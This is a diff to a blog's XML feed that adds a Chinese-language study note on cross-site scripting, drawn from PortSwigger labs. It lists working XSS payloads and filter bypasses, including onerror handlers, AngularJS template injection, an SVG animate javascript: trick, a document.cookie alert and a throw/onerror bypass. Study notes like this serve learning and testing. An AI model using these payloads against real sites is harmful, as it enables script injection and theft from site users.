@@ -4,6 +4,29 @@
   
     
     <entry>
+      <title>XSS Note</title>
+      <link href="/2023/12/23/xss-note/"/>
+      <url>/2023/12/23/xss-note/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這邊主要是紀錄我打XSS時學到的一些神奇招數，基本的XSS還是要到這邊看喔：<br><a href="https://portswigger.net/web-security/cross-site-scripting#what-is-cross-site-scripting-xss">Port Swigger</a><br>p.s.其實這些題目後面也都是從port swigger來ㄉ &gt;&lt;  </p><h2 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h2><h3 id="Basic-Payloads"><a href="#Basic-Payloads" class="headerlink" title="Basic Payloads:"></a>Basic Payloads:</h3><p>來複習一下(～￣▽￣)～<br><strong>For HTML:</strong>  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(1)&#x27;</span>&gt;</span></span><br><span class="line">&#x27;;-alert(1)-;&#x27;</span><br><span class="line">blablalba</span><br></pre></td></tr></table></figure><p><strong>Javascript Injection:</strong>  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;);alert(1);\\</span></span><br><span class="line"><span class="string">blablabla</span></span><br></pre></td></tr></table></figure><p><strong>DOM Base:</strong><br>是觸發於<code>document.write</code>這類寫入函數的弱點。<br>開啟Burp Suite Browser的f12工具列，找到DOM Invader，搜尋自己的input然後構造payload，後面就跟前面一樣ㄌ  </p><h3 id="HTML-Encode-Trick"><a href="#HTML-Encode-Trick" class="headerlink" title="HTML Encode Trick"></a>HTML Encode Trick</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apos;-<span class="title function_">alert</span>(<span class="number">1</span>)-&amp;apos;</span><br></pre></td></tr></table></figure><h3 id="Angular-js"><a href="#Angular-js" class="headerlink" title="Angular js"></a>Angular js</h3><p>Angular js 會去抓取格式如<code>&#123;&#123;&#125;&#125;</code>的東西當作模板去做處理，就跟SSTI一樣。<br><strong>Payloads</strong><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md">Angular js SSTI Payloads on Github</a>  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$on.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="Blocked-html-tags"><a href="#Blocked-html-tags" class="headerlink" title="Blocked html tags"></a>Blocked html tags</h3><p>第一個想法一定是暴力看看有那些tags和arguments可以用<br><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Payload List on Port Swigger</a><br>如果都不行的話，構造一個不存在的tag然後利用id+onfocus以及url fragment(<code>#</code>)去觸發XSS：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;xss+id=x+onfocus=<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) tabindex=<span class="number">1</span>&gt;#x<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><h3 id="Backtick-Injection"><a href="#Backtick-Injection" class="headerlink" title="Backtick Injection"></a>Backtick Injection</h3><p>透過使用如<code>$&#123;&#125;</code>的方式去呼叫js，一樣是一種SSTI(?)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="title function_">alert</span>(<span class="number">1</span>)&#125;</span><br></pre></td></tr></table></figure><h3 id="XML-attributeName"><a href="#XML-attributeName" class="headerlink" title="XML attributeName"></a>XML attributeName</h3><p>利用XML attributeName去改掉父標籤屬性。  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span>&lt;animate+attributeName=href+values=javascript:alert(1)+/&gt;&lt;text+x=20+y=20&gt;Click me<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="js-throw"><a href="#js-throw" class="headerlink" title="js throw"></a>js throw</h3><p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked">lab</a>  </p><ul><li>利用資料解析方式的不同去觸發injection</li></ul><p>throw+onerror可以觸發一系列行為。  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span>&amp;<span class="string">&#x27;&#125;,x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+&#x27;</span><span class="string">&#x27;,&#123;x:&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>應該還有些東西要補(  </p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Web Security </tag>
+            
+            <tag> Note </tag>
+            
+            <tag> XSS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>msfconsole Note</title>
       <link href="/2023/12/13/msfconsole/"/>
       <url>/2023/12/13/msfconsole/</url>
@@ -563,9 +586,9 @@
             
             <tag> LFI </tag>
             
-            <tag> XSS </tag>
-            
             <tag> loTuX CTF </tag>
+            
+            <tag> XSS </tag>
             
             <tag> RCE </tag>
             
